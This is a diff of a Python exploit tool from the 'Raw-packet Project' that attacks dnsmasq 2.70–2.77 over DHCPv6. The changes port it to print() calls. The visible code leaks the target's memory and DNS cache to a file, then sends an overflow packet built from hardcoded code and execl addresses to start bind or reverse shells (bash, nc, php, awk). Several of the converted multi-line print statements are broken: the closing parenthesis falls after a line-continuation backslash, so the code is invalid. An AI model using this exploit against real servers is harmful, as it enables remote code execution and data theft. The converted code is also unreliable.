@@ -47,7 +47,7 @@ __author__ = 'Vladimir Ivanov'
 __copyright__ = 'Copyright 2019, Raw-packet Project'
 __credits__ = ['hackituria']
 __license__ = 'MIT'
-__version__ = '0.0.4'
+__version__ = '0.1.1'
 __maintainer__ = 'Vladimir Ivanov'
 __email__ = 'ivanov.vladimir.mail@gmail.com'
 __status__ = 'Development'
@@ -397,10 +397,10 @@ ipv6src_link = Base.get_netiface_ipv6_link_address(current_network_interface)
 ipv6src = Base.get_netiface_ipv6_glob_address(current_network_interface)
 
 if ipv6src is None:
-    print Base.c_error + "Please set IPv6 global address to interface: " + current_network_interface
+    print(Base.c_error + "Please set IPv6 global address to interface: " + current_network_interface)
     exit(1)
 if ipv6src_link is None:
-    print Base.c_error + "Please set IPv6 link local address to interface: " + current_network_interface
+    print(Base.c_error + "Please set IPv6 link local address to interface: " + current_network_interface)
     exit(1)
 
 
@@ -422,14 +422,14 @@ architecture = ""
 if args.architecture == "i386" or "amd64" or "arm":
     architecture = args.architecture
 else:
-    print Base.c_error + "Bad architecture: " + args.architecture + ". Allow only arm, i386 or amd64!"
+    print(Base.c_error + "Bad architecture: " + args.architecture + ". Allow only arm, i386 or amd64!")
     exit(1)
 
 dnsmasq_version = ""
 if args.version == "2.70" or "2.71" or "2.72" or "2.73" or "2.74" or "2.75" or "2.76" or "2.77":
     dnsmasq_version = args.version
 else:
-    print Base.c_error + "Bad dnsmasq version: " + args.version + \
+    print(Base.c_error + "Bad dnsmasq version: " + args.version + \)
           " allow only 2.70, 2.71, 2.72, 2.73, 2.74, 2.75, 2.76 or 2.77!"
     exit(1)
 
@@ -442,12 +442,12 @@ reverse_port = str(4444)
 if 0 < int(args.bind_port) < 65535:
     bind_port = str(args.bind_port)
 else:
-    print Base.c_error + "Bad bind port: " + str(args.bind_port) + " allow only 1 ... 65534 ports"
+    print(Base.c_error + "Bad bind port: " + str(args.bind_port) + " allow only 1 ... 65534 ports")
 
 if 0 < int(args.reverse_port) < 65535:
     reverse_port = str(args.reverse_port)
 else:
-    print Base.c_error + "Bad reverse port: " + str(args.reverse_port) + " allow only 1 ... 65534 ports"
+    print(Base.c_error + "Bad reverse port: " + str(args.reverse_port) + " allow only 1 ... 65534 ports")
 
 reverse_host = "127.0.0.1"
 if args.reverse_host is None:
@@ -484,7 +484,7 @@ else:
     elif args.payload == "reverse_nc": payload = reverse_nc
     elif args.payload == "reverse_nce": payload = reverse_nce
     else:
-        print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \
+        print(Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \)
               "reverse_php, reverse_nc, reverse_nce!"
         exit(1)
 
@@ -494,7 +494,7 @@ dns_cache = {}
 
 def get_dhcpv6_server_duid():
     if dhcpv6_server_duid is None:
-        print Base.c_info + "Wait for receive DHCPv6 server DUID..."
+        print(Base.c_info + "Wait for receive DHCPv6 server DUID...")
         tm.add_task(recv_dhcpv6_reply)
         sleep(3)
         send_dhcpv6_solicit()
@@ -510,12 +510,12 @@ def get_dhcpv6_server_duid():
                 break
 
         if dhcpv6_server_duid is None:
-            print Base.c_error + "Can not get DHCPv6 server DUID!"
+            print(Base.c_error + "Can not get DHCPv6 server DUID!")
             return False
         else:
-            print Base.c_success + "DHCPv6 server MAC:       " + str(dhcpv6_server_mac)
-            print Base.c_success + "DHCPv6 server IPv6 link: " + str(dhcpv6_server_ipv6_link)
-            print Base.c_success + "DHCPv6 server DUID:      " + str(dhcpv6_server_duid).encode("hex")
+            print(Base.c_success + "DHCPv6 server MAC:       " + str(dhcpv6_server_mac))
+            print(Base.c_success + "DHCPv6 server IPv6 link: " + str(dhcpv6_server_ipv6_link))
+            print(Base.c_success + "DHCPv6 server DUID:      " + str(dhcpv6_server_duid).encode("hex"))
             return True
     else:
         return True
@@ -534,10 +534,10 @@ def send_dhcpv6_solicit():
         SOCK = socket(AF_PACKET, SOCK_RAW)
         SOCK.bind((current_network_interface, 0))
         SOCK.send(pkt)
-        print Base.c_info + "Send Solicit request to: [ff02::1:2]:547"
+        print(Base.c_info + "Send Solicit request to: [ff02::1:2]:547")
         SOCK.close()
     except:
-        print Base.c_error + "Do not send Solicit request."
+        print(Base.c_error + "Do not send Solicit request.")
         exit(1)
 
 
@@ -802,10 +802,10 @@ def data_leak():
         SOCK = socket(AF_PACKET, SOCK_RAW)
         SOCK.bind((current_network_interface, 0))
         SOCK.send(pkt)
-        print Base.c_info + "Send data leak request to: [" + host + "]:547"
+        print(Base.c_info + "Send data leak request to: [" + host + "]:547")
         SOCK.close()
     except:
-        print Base.c_error + "Do not send data leak request."
+        print(Base.c_error + "Do not send data leak request.")
         exit(1)
 
     with open(args.file_name, 'wb') as response_file:
@@ -817,21 +817,21 @@ def data_leak():
             # Delete iptables rules to DROP icmp packets
             system("ip6tables -D OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
-            print Base.c_error + "Can not receive data leak response!"
+            print(Base.c_error + "Can not receive data leak response!")
             sock.close()
             exit(1)
 
     data_leak_size = stat(args.file_name).st_size
     if data_leak_size == LEAK_BYTES:
-        print Base.c_success + "Length data leak response: " + str(hex(data_leak_size))
+        print(Base.c_success + "Length data leak response: " + str(hex(data_leak_size)))
         analyze_leak_data()
     else:
-        print Base.c_error + "Bad length of data leak response: " + str(hex(data_leak_size))
+        print(Base.c_error + "Bad length of data leak response: " + str(hex(data_leak_size)))
 
     # Delete iptables rules to DROP icmp packets
     system("ip6tables -D OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
-    print Base.c_info + "Dump data leak response to file: " + args.file_name
+    print(Base.c_info + "Dump data leak response to file: " + args.file_name)
     sock.close()
 
 
@@ -853,13 +853,13 @@ def analyze_leak_data():
             tmp_dns_cache[offset] = {"addr": str(inet_ntoa(ipv4)), "name": str(domain)}
 
     if len(tmp_dns_cache) > 0:
-        print Base.c_success + "Leak DNS cache: "
+        print(Base.c_success + "Leak DNS cache: ")
         dns_cache = OrderedDict(sorted(tmp_dns_cache.items()))
         for offset in dns_cache.keys():
-            print Base.c_info + "offset: " + hex(offset) + " - " \
+            print(Base.c_info + "offset: " + hex(offset) + " - " \)
                   + dns_cache[offset]["name"] + ": " + dns_cache[offset]["addr"]
     else:
-        print Base.c_error + "Do not find DNS cache in leak data!"
+        print(Base.c_error + "Do not find DNS cache in leak data!")
 
 
 def exploit():
@@ -994,7 +994,7 @@ def exploit():
         option_79 += Base.pack32(0x00000000)
 
     else:
-        print Base.c_error + "This architecture: " + architecture + " not yet supported!"
+        print(Base.c_error + "This architecture: " + architecture + " not yet supported!")
         exit(1)
 
     link_addr = ipv6r.get_random_ip(7, "1337:")
@@ -1014,37 +1014,37 @@ def exploit():
         SOCK = socket(AF_PACKET, SOCK_RAW)
         SOCK.bind((current_network_interface, 0))
         SOCK.send(pkt)
-        print Base.c_success + "Send exploit request to: [" + host + "]:547"
+        print(Base.c_success + "Send exploit request to: [" + host + "]:547")
         SOCK.close()
     except:
-        print Base.c_error + "Do not send exploit request."
+        print(Base.c_error + "Do not send exploit request.")
         exit(1)
 
 
 if __name__ == '__main__':
-    print Base.c_info + "Network interface name:      " + current_network_interface
-    print Base.c_info + "Network interface MAC:       " + macsrc
-    print Base.c_info + "Network interface IPv6 glob: " + ipv6src
-    print Base.c_info + "Network interface IPv6 link: " + ipv6src_link
+    print(Base.c_info + "Network interface name:      " + current_network_interface)
+    print(Base.c_info + "Network interface MAC:       " + macsrc)
+    print(Base.c_info + "Network interface IPv6 glob: " + ipv6src)
+    print(Base.c_info + "Network interface IPv6 link: " + ipv6src_link)
 
     if args.exploit:
-        print Base.c_info + "Architecture:    " + architecture
-        print Base.c_info + "Dnsmasq version: " + dnsmasq_version
-        print Base.c_info + "Interpreter:     " + interpreter
-        print Base.c_info + "Interpreter arg: " + interpreter_arg
+        print(Base.c_info + "Architecture:    " + architecture)
+        print(Base.c_info + "Dnsmasq version: " + dnsmasq_version)
+        print(Base.c_info + "Interpreter:     " + interpreter)
+        print(Base.c_info + "Interpreter arg: " + interpreter_arg)
 
         if args.payload.startswith("reverse"):
-            print Base.c_info + "Payload reverse host: " + reverse_host
-            print Base.c_info + "Payload reverse port: " + reverse_port
+            print(Base.c_info + "Payload reverse host: " + reverse_host)
+            print(Base.c_info + "Payload reverse port: " + reverse_port)
         if args.payload.startswith("bind"):
-            print Base.c_info + "Payload bind port: " + bind_port
+            print(Base.c_info + "Payload bind port: " + bind_port)
 
-        print Base.c_info + "Payload: " + payload
+        print(Base.c_info + "Payload: " + payload)
 
         if args.architecture == "i386" or args.architecture == "amd64":
-            print Base.c_info + "Address segment .text:  " + str(hex(TEXT[architecture][dnsmasq_version]))
-            print Base.c_info + "Address segment .data:  " + str(hex(DATA[architecture][dnsmasq_version]))
-            print Base.c_info + "Address execl function: " + str(hex(EXECL[architecture][dnsmasq_version]))
+            print(Base.c_info + "Address segment .text:  " + str(hex(TEXT[architecture][dnsmasq_version])))
+            print(Base.c_info + "Address segment .data:  " + str(hex(DATA[architecture][dnsmasq_version])))
+            print(Base.c_info + "Address execl function: " + str(hex(EXECL[architecture][dnsmasq_version])))
 
         exploit()
 
